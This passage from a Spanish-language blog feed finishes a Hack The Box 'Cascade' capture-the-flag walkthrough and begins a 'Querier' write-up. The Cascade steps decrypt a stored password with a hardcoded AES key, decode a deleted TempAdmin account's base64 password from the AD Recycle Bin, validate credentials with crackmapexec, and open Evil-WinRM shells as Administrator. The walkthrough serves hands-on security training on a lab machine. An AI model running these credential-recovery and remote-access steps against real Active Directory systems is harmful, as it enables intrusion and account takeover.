key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; b&lt;span class=&quot;s2&quot;&gt;&quot;c4scadek3y654321&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Encontramos esta KEY mirando el Codigo del CascAudit.exe desde Windows con DotUltimate &lt;/span&gt;
iv &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; b&lt;span class=&quot;s2&quot;&gt;&quot;1tdyjCbY1Ix49842&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# CBC Operation&lt;/span&gt;
aes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pyaes.AESModeOfOperationCBC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;key, iv &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; iv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Desencriptado con la password que encontramos en Audit.db&lt;/span&gt;
decrypted &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; aes.decrypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;b64decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;BQO5l5Kj9MdErXx6Q6AGOw==&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;decrypted.decode&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a usar el script en python una vez seteamos el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;La Password encontrada en Decrypted&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 Decode_Pass.py                                                                                                 1 ⚙&lt;/span&gt;

w3lc0meFr31nd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya tendriamos la contraseña del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkSvc&lt;/code&gt;, procedemos a validarla con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crackmapexec&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                           1 ⚙&lt;/span&gt;
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] cascade.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc:w3lc0meFr31nd 
                                                                                                                                                                      &lt;span class=&quot;c&quot;&gt;# crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                         1 ⚙&lt;/span&gt;
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] cascade.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc:w3lc0meFr31nd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar conectarnos como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkSvc&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm.rb&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                         1 ⚙&lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos los privilegios para el usuario&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /all

USER INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;

User Name      SID
&lt;span class=&quot;o&quot;&gt;==============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================================&lt;/span&gt;
cascade&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

Group Name                                  Type             SID                                            Attributes
&lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;T                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;D Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos los Grupos a los que pertenece el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkSvc&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt; net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
Users comment
Country code                 000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System Default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Account active               Yes
Account expires              Never

Password last &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;1/9/2020 4:18:20 PM
Password expires             Never
Password changeable          1/9/2020 4:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 9:05:40 PM

Logon hours allowed          All

Local Group Memberships      &lt;span class=&quot;s2&quot;&gt;&quot;*AD Recycle Bin&quot;&lt;/span&gt;       &lt;span class=&quot;s2&quot;&gt;&quot;*IT&quot;&lt;/span&gt;
                             &lt;span class=&quot;s2&quot;&gt;&quot;*Remote Management Use&quot;&lt;/span&gt;
Global Group memberships     &lt;span class=&quot;s2&quot;&gt;&quot;*Domain Users&quot;&lt;/span&gt;
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que pertenecemos al Grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AD Recycle Bin&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Get-ADObject &lt;span class=&quot;nt&quot;&gt;-ldapfilter&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(&amp;amp;(isDeleted=TRUE))&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt;


Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CASC-WS1&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Scheduled Tasks&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;A403B701-A528-4685-A816-FDEE32BDDCBA&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;A403B701-A528-4685-A816-FDEE32BDDCBA&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Machine&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;User&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TempAdmin&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a buscar por el Name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Temp Admin&lt;/code&gt; que como nos decian habia tenido temporamente una password = a la del Administrador&lt;/p&gt;

&lt;p&gt;Procedemos a intentar listar todo el Contenido anterior y sus Propiedades con el siguiente Comando en PowerShell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;rksvc&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Get-ADObject &lt;span class=&quot;nt&quot;&gt;-ldapfilter&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(&amp;amp;(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
&lt;span class=&quot;s2&quot;&gt;&quot;cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz&quot;&lt;/span&gt;
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TempAdmin&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;dSCorePropagationData           : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : &lt;span class=&quot;nv&quot;&gt;OU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a decodear la password&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YmFDVDNyMWFOMDBkbGVz&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 

&lt;span class=&quot;s2&quot;&gt;&quot;baCT3r1aN00dles&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probamos con Crackmapexec a hacer validar para que usuario perneceria esta password&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.182 -u users -p baCT3r1aN00dles                                                                             &lt;/span&gt;
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] cascade.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:baCT3r1aN00dles &lt;span class=&quot;s2&quot;&gt;&quot;(Pwn3d!)&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a conectarnos con Evil WinRM y sacar la Flag de Root.txt&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm.rb -i 10.10.10.182 -u administrator -p baCT3r1aN00dles                                                 &lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../Desktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;        1/25/2022   8:53 AM             34 root.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
XXXXXXXXXXb5ab6469c8baea4d5xxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Cascade - AD Path - Rooteada =) Seguimos H4ck&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="LDAP," /><category term="RPCCLIENT," /><category term="ASREPRoast" /><category term="Attack," /><category term="Crackmapexec," /><category term="VNC" /><category term="Encrypt-Decrypt," /><category term="Shares" /><category term="Groups," /><category term="Get-ADObject," /><category term="AD" /><category term="Recycle" /><category term="Bin" /><category term="Group," /><category term="Powershell," /><category term="Evil-WinRm," /><category term="Maquinas" /><category term="Retiradas" /><summary type="html">Cascade - AD Path ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Querier de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/01/04/Querier.html" rel="alternate" type="text/html" title="Maquina Retirada Querier de Hack The Box (Necesario VIP)" /><published>2022-01-04T00:00:00-03:00</published><updated>2022-01-04T00:00:00-03:00</updated><id>http://localhost:4000/2022/01/04/Querier</id><content type="html" xml:base="http://localhost:4000/2022/01/04/Querier.html">&lt;h1 id=&quot;querier--hack-the-box&quot;&gt;Querier ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.125       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
